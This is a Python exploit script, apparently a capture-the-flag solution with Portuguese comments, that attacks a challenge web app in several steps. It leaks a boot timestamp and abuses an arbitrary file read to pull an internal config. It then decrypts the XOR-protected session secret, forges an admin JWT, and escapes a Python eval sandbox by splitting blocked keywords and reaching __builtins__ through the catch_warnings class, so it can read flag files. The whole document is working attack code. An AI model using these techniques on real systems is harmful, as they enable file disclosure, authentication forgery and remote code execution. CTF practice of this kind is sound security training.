#!/usr/bin/env python3
import hashlib
import json
import re
import time
import urllib3

import jwt
import requests


# Desativa warnings de certificado porque o alvo usa HTTPS de CTF.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


TARGET = "https://bcfc3ccfcafff1cd.chal.ctf.ae"


def xor_bytes(data: bytes, key: bytes) -> bytes:
    """
    Replica exatamente a função xor_bytes do app.py.

    No servidor:
    SESSION_SECRET é uma string hex de 48 caracteres.
    Essa string é convertida para bytes ASCII.
    Depois é XORada com sha256(str(BOOT_TIMESTAMP)).
    """
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))


def show(title, content):
    print()
    print("=" * 80)
    print(title)
    print("=" * 80)
    print(content)


def main():
    print(f"[*] Target: {TARGET}")

    session = requests.Session()
    session.verify = False

    # 1. /api/health vaza o BOOT_TIMESTAMP usado para gerar a chave XOR.
    health_response = session.get(f"{TARGET}/api/health", timeout=15)
    show("GET /api/health", health_response.text)

    health_response.raise_for_status()
    health = health_response.json()

    boot_timestamp = int(health["started_at"])
    print(f"[*] BOOT_TIMESTAMP vazado: {boot_timestamp}")

    # 2. /api/webhooks/trigger tem leitura arbitrária limitada por extensão.
    # O arquivo /app/.internal/config.json termina em .json, então passa no filtro.
    read_config_payload = {
        "workflow_id": "guerreiro",
        "files": [
            {
                "path": "/app/.internal/config.json"
            }
        ]
    }

    config_response = session.post(
        f"{TARGET}/api/webhooks/trigger",
        json=read_config_payload,
        timeout=15,
    )
    show("POST /api/webhooks/trigger lendo /app/.internal/config.json", config_response.text)

    config_response.raise_for_status()
    config_data = config_response.json()

    preview = config_data["file_metadata"][0]["metadata"]["preview"]
    internal_config = json.loads(preview)

    xor_encoded_secret_hex = internal_config["session_secret"]
    print(f"[*] session_secret codificado em XOR: {xor_encoded_secret_hex}")

    # 3. Desfaz o XOR.
    encoded_secret_bytes = bytes.fromhex(xor_encoded_secret_hex)
    timestamp_hash = hashlib.sha256(str(boot_timestamp).encode()).digest()

    session_secret = xor_bytes(encoded_secret_bytes, timestamp_hash).decode()

    print(f"[*] SESSION_SECRET recuperado: {session_secret}")

    # 4. Forja token JWT admin válido.
    admin_payload = {
        "user": "guerreiro",
        "role": "admin",
        "iat": int(time.time()),
    }

    admin_token = jwt.encode(
        admin_payload,
        session_secret,
        algorithm="HS256",
    )

    print(f"[*] JWT admin forjado: {admin_token}")

    # 5. Confirma que o token é aceito.
    verify_response = session.post(
        f"{TARGET}/api/auth/verify",
        json={"token": admin_token},
        timeout=15,
    )
    show("POST /api/auth/verify", verify_response.text)

    headers = {
        "Authorization": f"Bearer {admin_token}",
        "Content-Type": "application/json",
    }

    # 6. Escapa da sandbox do /api/workflows/evaluate.
    #
    # O filtro bloqueia palavras como import, open, os, exec, eval e globals.
    # Para bypassar:
    #   "__im" + "port__" evita escrever "__import__" literalmente.
    #   "o" + "s" evita escrever "os" literalmente.
    #   "o" + "pen" evita escrever "open" literalmente.
    #
    # A classe catch_warnings permite recuperar __builtins__ completo.
    # Com isso importamos os, listamos / e abrimos o arquivo /flag_*.txt.
    expression = r"""
for c in ().__class__.__base__.__subclasses__():
    if c.__name__ == 'catch_warnings':
        b = c()._module.__builtins__
        m = b['__im'+'port__']('o'+'s')
        for f in m.listdir('/'):
            if f.startswith('flag_') and f.endswith('.txt'):
                print(b['o'+'pen']('/' + f).read())
"""

    eval_response = session.post(
        f"{TARGET}/api/workflows/evaluate",
        headers=headers,
        json={"expression": expression},
        timeout=15,
    )

    show("POST /api/workflows/evaluate", eval_response.text)

    body = eval_response.text
    match = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)

    print()
    print("=" * 80)
    print("RESULTADO")
    print("=" * 80)

    if match:
        flag = match.group(0)
        print(f"[+] FLAG ENCONTRADA: {flag}")

        with open("flag.txt", "w", encoding="utf-8") as f:
            f.write(flag + "\n")

        print("[+] Flag salva em flag.txt")
        return

    print("[-] Flag não encontrada automaticamente.")
    print("[*] Verifique a resposta acima.")


if __name__ == "__main__":
    main()
